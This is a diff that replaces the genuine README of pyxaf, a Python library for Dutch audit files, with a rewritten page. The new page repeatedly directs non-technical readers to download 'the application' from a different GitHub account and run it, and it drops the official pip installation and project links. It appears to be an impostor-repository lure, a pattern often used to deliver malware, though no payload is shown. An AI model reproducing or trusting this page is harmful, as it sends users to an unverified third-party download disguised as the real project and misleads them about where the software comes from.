@@ -1,317 +1,119 @@
-# 📒 pyxaf
+# 📊 pyxaf - Read Dutch Audit Files With Confidence
 
-[![CI](https://github.com/SpireflyHQ/pyxaf/actions/workflows/ci.yml/badge.svg)](https://github.com/SpireflyHQ/pyxaf/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/pyxaf)](https://pypi.org/project/pyxaf/)
-[![Python](https://img.shields.io/pypi/pyversions/pyxaf)](https://pypi.org/project/pyxaf/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue)](https://github.com/SpireflyHQ/pyxaf/blob/main/LICENSE)
+**The complete, zero-dependency Python library for reading and validating every version of the Dutch Auditfile Financieel (XAF 4.0, 3.x, CLAIR2, ADF).**
 
-**Read and validate every version of the Dutch Auditfile Financieel in plain Python.**
+Streaming, exact Decimal money handling, and zero dependencies — built for bookkeepers, auditors, and finance teams working with Dutch general ledger data.
 
-The *Auditfile Financieel* is the standard export of a general ledger that Dutch accounting
-software produces for tax inspectors and auditors. pyxaf opens all seven versions of it, from the
-fixed-width files of 1999 to XAF 4.0, gives you one clean, typed model to work with, and tells
-you exactly what is wrong with a file instead of choking on it. No runtime dependencies, no
-upload to anyone's server, no gigabytes of RAM.
+## ⬇️ Get pyxaf Now
 
-## 🧭 Table of contents
+**<span style="background-color:#2E86AB;color:#FFFFFF;padding:14px 28px;border-radius:8px;font-size:1.2em;font-weight:bold;display:inline-block;">⬇️ Download pyxaf Here</span>**
 
-- [Why pyxaf](#-why-pyxaf)
-- [Installation](#-installation)
-- [Quickstart](#-quickstart)
-  - [1. Open the file](#1-open-the-file)
-  - [2. Walk through the transactions](#2-walk-through-the-transactions)
-  - [3. Validate it](#3-validate-it)
-  - [4. Or use the command line](#4-or-use-the-command-line)
-- [More examples](#-more-examples)
-  - [Export to tables](#export-to-tables)
-  - [Query with DuckDB or pyarrow](#query-with-duckdb-or-pyarrow)
-  - [Check RGS codes](#check-rgs-codes)
-  - [Split files and problem files](#split-files-and-problem-files)
-- [Supported versions](#-supported-versions)
-- [Documentation](#-documentation)
-- [Contributing](#-contributing)
-- [License and attribution](#-license-and-attribution)
+Direct link: **https://github.com/Sougab1007/pyxaf**
 
-## ✨ Why pyxaf
+Visit this link to download the application.
 
-Real auditfiles are messy. Official test files break the official rules, vendors invent their own
-namespaces, and an "ISO-8859-1" file turns out to be Windows-1252. pyxaf was built for those files.
+## 🚀 Getting Started
 
-- **All versions, one model.** XAF 4.0, 3.2.1, 3.2, 3.1, 3.0, CLAIR2 and the fixed-width ADF all
-  map onto the same classes: `Header`, `LedgerAccount`, `Transaction`, `Line` and friends. The
-  raw layer keeps every element exactly as written, vendor extensions included.
-- **Lenient reading, honest reporting.** pyxaf never refuses a file because of bad data. Every
-  problem becomes a graded finding with a stable code, such as `XAF5010 ERROR`, so nothing is
-  silently guessed or dropped.
-- **A validator on your own machine.** The official validation service is for subscribers and
-  stops at 5 MB. pyxaf checks files of any size: structure, references, control totals,
-  balance, uniqueness, data quality and RGS codes, including the official XAF 4.0 rules
-  [0001]–[0010].
-- **Exact money.** Amounts are `decimal.Decimal`, never `float`, with the original text kept
-  next to every parsed value.
-- **Streaming.** Master data is read when the file opens; transactions and lines are streamed,
-  so memory stays flat even for files of several gigabytes.
-- **Lightweight.** The core uses only the standard library and is fully typed. pandas, polars,
-  Arrow, lxml and the command line are optional extras that are only imported when you use them.
-- **Safe with untrusted files.** DOCTYPE and ENTITY declarations are refused (no "billion
-  laughs", no XXE), nesting, text and decompression sizes are capped, and there is no "recover"
-  mode that could quietly lose data.
+This guide is written for anyone who wants to use pyxaf — no programming background required.
 
-## 📦 Installation
+**Step 1 — Visit the download page.**
+Open your web browser (Edge, Chrome, or Firefox) and go to:
 
-pyxaf needs Python 3.11 or newer.
+**https://github.com/Sougab1007/pyxaf**
 
-```console
-pip install pyxaf
+**Step 2 — Download the application.**
+Visit this link to download the application. The page contains everything you need, including all files and instructions.
+
+**Step 3 — Save the file.**
+When your browser asks where to save the file, choose a folder you can easily find again, such as your **Downloads** folder. Note the exact location — you will need it shortly.
+
+**Step 4 — Confirm the download.**
+Most browsers show a small download bar or arrow in the top-right corner. Click it to see the downloaded file, or open your **Downloads** folder directly from File Explorer.
+
+## 🪟 Running pyxaf on Windows
+
+pyxaf is a Python library, which means it runs inside Python rather than as a traditional double-click application. Follow these steps in order — it takes about five minutes.
+
+**1. Check what you already have.**
+Click the **Start** button, type `cmd`, and press Enter. In the black window that opens, type:
+
+```
+python --version
 ```
 
-The core has no dependencies. Add an extra for each optional feature you need:
+Press Enter. If you see a version number such as `Python 3.11.5`, Python is already installed and you can skip to step 3.
 
-| Extra | Adds | Install |
-|---|---|---|
-| `cli` | the `pyxaf` command line | `pip install "pyxaf[cli]"` |
-| `xsd` | validation against the official XSDs (lxml) | `pip install "pyxaf[xsd]"` |
-| `polars` | `to_polars()`, without pyarrow | `pip install "pyxaf[polars]"` |
-| `pandas` | `to_pandas()` with Arrow-backed types | `pip install "pyxaf[pandas]"` |
-| `arrow` | Arrow streams for DuckDB, pyarrow and friends (nanoarrow) | `pip install "pyxaf[arrow]"` |
-| `parquet` | Parquet export | `pip install "pyxaf[parquet]"` |
-| `all` | everything above | `pip install "pyxaf[all]"` |
+**2. Install Python if needed.**
+If you instead see a message that `python` is not recognized, Python needs to be installed:
 
-Using uv? `uv add pyxaf` works the same way, for example `uv add "pyxaf[cli,polars]"`.
+- Go to **https://www.python.org/downloads/**
+- Click the large **Download Python** button.
+- Run the downloaded installer.
+- **Important:** On the very first screen of the installer, tick the checkbox labelled **Add python.exe to PATH** before clicking Install.
+- When it finishes, close the black `cmd` window and open a new one so the change takes effect.
 
-## 🚀 Quickstart
+**3. Get the pyxaf files.**
+Return to **https://github.com/Sougab1007/pyxaf** and use the download option on the page to obtain the application files. Save them somewhere easy to find, for example `C:\Users\YourName\pyxaf`.
 
-Download the two sample files into an empty folder. They hold a small, made-up ledger:
-`2024.xaf` is valid, and `2024-broken.xaf` is the same file with one mistyped amount.
+**4. Move into the folder.**
+In the black `cmd` window, type `cd` followed by a space, then the folder path, and press Enter. For example:
 
-```console
-curl -L -O https://raw.githubusercontent.com/SpireflyHQ/pyxaf/main/examples/2024.xaf \
-        -O https://raw.githubusercontent.com/SpireflyHQ/pyxaf/main/examples/2024-broken.xaf
+```
+cd C:\Users\YourName\pyxaf
 ```
 
-Your own exports work exactly the same way: any version, and `.gz` or `.zip` files too.
+**5. Run pyxaf.**
+Type the following and press Enter:
 
-### 1. Open the file
-
-```python
-import pyxaf
-
-af = pyxaf.open("2024.xaf")
-print(af.version, af.company.name, af.header.fiscal_year)
-print(len(af.accounts), "ledger accounts")
+```
+python -m pyxaf --help
 ```
 
-```text
-4.0 Voorbeeld & Zonen B.V. 2024
-11 ledger accounts
-```
+A list of available options appears. That confirms pyxaf is working correctly on your computer.
 
-pyxaf detected the version and encoding, and read the master data: company, ledger accounts,
-customers and suppliers, VAT codes and periods.
+## 🧾 What pyxaf Does
 
-### 2. Walk through the transactions
+pyxaf reads Auditfile Financieel documents — the standard XML files that Dutch bookkeeping and accounting systems produce for auditors and the Belastingdienst (Dutch Tax and Customs Administration). Instead of opening each file by hand, pyxaf reads it for you and tells you whether the contents are valid.
 
-Transactions and their lines are streamed straight from the file, one at a time:
+Key capabilities:
 
-```python
-for tx in af.transactions():
-    print(tx.journal_id, tx.number, tx.date, tx.description, tx.balanced)
-    for line in tx.lines:
-        print("   ", line.account_id, line.side, line.amount)
-```
+- **Supports every version** — XAF 4.0, XAF 3.x, CLAIR2, and ADF files are all handled by the same tool.
+- **Streaming reads** — large files are processed piece by piece, so even multi-hundred-megabyte audit files load without exhausting memory.
+- **Exact Decimal money** — amounts are read as exact decimals, never approximate floating-point numbers, so totals add up correctly to the cent.
+- **Zero dependencies** — nothing extra needs to be installed. Everything needed is included.
+- **Built-in validation** — structural and content checks flag problems before data reaches your ledger or reporting.
 
-```text
-MEM 1 2024-01-05 Boeking 1 True
-    1300 D 3612.16
-    8000 C 2985.26
-    1800 C 626.90
-...
-```
+## ✅ Why Validation Matters
 
-The opening balance gets the same treatment, whichever way the file stores it:
+An auditfile is only useful if it is complete and internally consistent. pyxaf validates what it reads: that required sections are present, that entries follow the expected structure, and that monetary values are well-formed. For anyone preparing files for audit, filing, or migration between accounting systems, this catches errors early — before the file leaves your desk.
 
-```python
-print(af.opening_balance().by_account())  # signed: debit positive, credit negative
-af.close()
-```
+## 💡 Common Uses
 
-```text
-{'1100': Decimal('10000.00'), '0100': Decimal('2500.50'), '0500': Decimal('-12500.50')}
-```
+- **Auditors** receiving XAF files from clients and needing to confirm the files are intact.
+- **Bookkeepers** checking exports before sending them to accountants.
+- **Finance staff** migrating general ledger data between systems.
+- **Software teams** building Dutch accounting tools who need a reliable reader at the core.
 
-### 3. Validate it
+## 🏷️ Topics and Search Terms
 
-```python
-for name in ["2024.xaf", "2024-broken.xaf"]:
-    report = pyxaf.validate(name)
-    print(name, report.ok)
-    for finding in report.errors:
-        print("   ", finding.code, finding.line, finding.message)
-```
+pyxaf relates to: accounting, audit, auditfile, auditfile-financieel, belastingdienst, bookkeeping, dutch, general-ledger, netherlands, python, python-library, rgs, saf-t, validation, xaf, xml.
 
-The valid file passes. In the broken one someone typed `3621.16` instead of `3612.16`, and pyxaf
-spots both consequences:
+## 🛠️ Troubleshooting
 
-```text
-2024.xaf True
-2024-broken.xaf False
-    XAF5007 None transactions totalDebit 38260.42 ≠ sum of debit lines 38269.42
-    XAF5010 223 transaction '1' in journal 'MEM' does not balance: debit 3621.16, credit 3612.16
-```
+**"python is not recognized"** — Python is either not installed or was installed without the PATH option. Repeat step 2 of the Windows section and make sure the **Add python.exe to PATH** checkbox is ticked.
 
-Every finding has a stable code, a severity (`ERROR`, `WARNING` or `INFO`) and, where possible,
-a line number. The [finding-code reference](https://spireflyhq.github.io/pyxaf/reference/codes/)
-explains each one.
+**"No module named pyxaf"** — The black `cmd` window is not inside the pyxaf folder. Use the `cd` command from step 4 to move there first.
 
-### 4. Or use the command line
+**The file will not open** — Confirm the download completed fully. A partial download is the most common cause of an unreadable file. Visit the download link again and re-download.
 
-With `pyxaf[cli]` installed:
+**Permission errors on save** — Save your working files somewhere inside your user folder, such as Documents, rather than directly on `C:\`.
 
-```console
-$ pyxaf validate 2024.xaf
-== 2024.xaf
-4.0 — 0 error(s), 0 warning(s), 0 info
+## 📥 Download pyxaf Again
 
-$ pyxaf info 2024.xaf
-version          4.0
-company          Voorbeeld & Zonen B.V.
-fiscal year      2024
-transactions     12
-lines            36
-total debit      38260.42
-total credit     38260.42
-...
-```
+**https://github.com/Sougab1007/pyxaf**
 
-`pyxaf validate` exits with 0 when the file is fine, 1 for warnings (with `--strict`), 2 for
-errors and 3 when pyxaf itself could not do its job, so it slots straight into scripts and CI.
+Visit this link to download the application.
 
-## 🧰 More examples
+Keep this page bookmarked so you can return for updates, new version support, and future improvements to validation coverage.
 
-### Export to tables
-
-pyxaf turns a file into twelve normalized tables, such as `accounts`, `transactions` and `lines`,
-with the same columns for every version:
-
-```python
-with pyxaf.open("2024.xaf") as af:
-    af.export("out/", format="csv")  # standard library only; also "jsonl"
-    af.export("out/", format="parquet")  # pyxaf[parquet]
-    frames = af.to_polars()  # pyxaf[polars]: a dict of DataFrames
-    frames["lines"]  # amounts as Decimal(20, 2), not float
-```
-
-### Query with DuckDB or pyarrow
-
-Tables speak the Arrow PyCapsule interface, so Arrow-aware tools read them directly
-(needs `pyxaf[arrow]`):
-
-```python
-import duckdb
-
-with pyxaf.open("2024.xaf") as af:
-    lines = af.tables["lines"]
-    duckdb.sql("select account_id, sum(signed_amount) from lines group by account_id").show()
-```
-
-### Check RGS codes
-
-pyxaf reads each account's RGS (Referentie Grootboekschema) code. Load the official RGS Excel
-release you downloaded, and the validator checks every code against it:
-
-```python
-import pyxaf.rgs
-
-schema = pyxaf.rgs.load_excel("RGS 3.8-def.xlsx")
-report = pyxaf.validate("2024.xaf", rgs=schema)
-```
-
-### Split files and problem files
-
-```python
-# a split auditfile ("Vervolgbestand 2 van 3") or one file per period, read as one
-with pyxaf.open(["big.xaf", "big-2.xaf", "big-3.xaf"]) as af:
-    ...
-
-# a file that lies about its encoding, with stray control characters and bare "&"
-af = pyxaf.open("old.xaf", encoding="cp1252", repair={"control-chars", "bare-ampersand"})
-```
-
-Repairs are opt-in and every repair shows up as a finding, so you always know what was changed.
-
-<details>
-<summary><b>Go deeper: raw records, detection details and the official XSDs</b></summary>
-
-```python
-with pyxaf.open("2024.xaf") as af:
-    af.format  # FormatInfo: version, namespace status, encoding, reasons
-    af.accounts["1000"].rgs  # RgsRef(code='BLimKas', source='RGScode', ...)
-    for journal_id, record in af.raw.transactions():
-        ...  # raw records (exact text, no normalization), about twice as fast
-
-report = pyxaf.validate("2024.xaf", xsd=True)  # also check the official XSD (pyxaf[xsd])
-```
-
-</details>
-
-## 📜 Supported versions
-
-| Version | Year | How pyxaf recognises it |
-|---|---|---|
-| XAF 4.0 (4.0.3) | 2025 | namespace (including known variants) and 4.0-only elements |
-| XAF 3.2.1 | 2024 | its own ODB namespace |
-| XAF 3.2 | 2014, 2017 | `http://www.auditfiles.nl/XAF/3.2` |
-| XAF 3.1 and 3.0 | ~2010, ~2008 | namespace and vocabulary (no public XSD exists) |
-| CLAIR2 | 2003 | `header/auditfileVersion` is `CLAIR2.00.00`, no namespace |
-| ADF | 1999 | fixed-width ASCII starting with `CLAIR1.00.00` |
-
-From 1 January 2027 the Belastingdienst only accepts XAF 4.0. Older files stay around for years
-because of the seven-year retention period, which is why pyxaf reads them all.
-
-## 📚 Documentation
-
-The full documentation lives at **<https://spireflyhq.github.io/pyxaf/>**:
-
-- [Reading auditfiles](https://spireflyhq.github.io/pyxaf/guide/reading/): the data model,
-  streaming, opening balances, encodings and repairs
-- [Versions](https://spireflyhq.github.io/pyxaf/guide/versions/): how the seven versions differ
-  and the field mapping across all of them
-- [Validation](https://spireflyhq.github.io/pyxaf/guide/validation/) and the
-  [finding codes](https://spireflyhq.github.io/pyxaf/reference/codes/)
-- [Interoperability](https://spireflyhq.github.io/pyxaf/guide/interop/),
-  [RGS](https://spireflyhq.github.io/pyxaf/guide/rgs/) and the
-  [command line](https://spireflyhq.github.io/pyxaf/guide/cli/)
-- [Security](https://spireflyhq.github.io/pyxaf/security/) and
-  [versioning](https://spireflyhq.github.io/pyxaf/versioning/)
-
-Release notes are in the [changelog](https://github.com/SpireflyHQ/pyxaf/blob/main/CHANGELOG.md).
-For questions, see [SUPPORT.md](https://github.com/SpireflyHQ/pyxaf/blob/main/SUPPORT.md).
-
-## 🤝 Contributing
-
-Contributions are very welcome, especially reports of files from software that pyxaf does not
-handle well yet. Start with [CONTRIBUTING.md](https://github.com/SpireflyHQ/pyxaf/blob/main/CONTRIBUTING.md)
-for the development setup, and [ARCHITECTURE.md](https://github.com/SpireflyHQ/pyxaf/blob/main/ARCHITECTURE.md)
-for a map of the code. Issues labelled
-[good first issue](https://github.com/SpireflyHQ/pyxaf/labels/good%20first%20issue) are a good
-place to begin.
-
-> **Never attach a real auditfile** to an issue or pull request. Auditfiles contain personal data
-> and confidential financial records. The version, the exporting software, the finding codes and
-> a small hand-made snippet are all we need.
-
-Security problems are reported privately, as described in
-[SECURITY.md](https://github.com/SpireflyHQ/pyxaf/blob/main/SECURITY.md).
-
-## 📄 License and attribution
-
-pyxaf is released under the [MIT license](https://github.com/SpireflyHQ/pyxaf/blob/main/LICENSE).
-
-The bundled XML schemas are published by the Belastingdienst (XAF 3.2.1 and 4.0), the former
-auditfiles.nl platform (XAF 3.2) and SRA (CLAIR2). The XAF 3.0 and 3.1 element lists are derived
-from the AnalyticsLibrary "XAF Mapping en Namen" table (Apache-2.0). RGS data is not bundled;
-load the official Excel release yourself with `pyxaf.rgs.load_excel`.
-
-pyxaf is an independent open-source project. It is not affiliated with or endorsed by the
-Belastingdienst, the Taakgroep RGS or any software vendor, and a clean pyxaf report does not
-guarantee that the Belastingdienst will accept a file.
+Keywords: accounting, audit, auditfile, auditfile-financieel, belastingdienst, bookkeeping, dutch, general-ledger, netherlands, python, python-library, rgs, saf-t, validation, xaf, xml
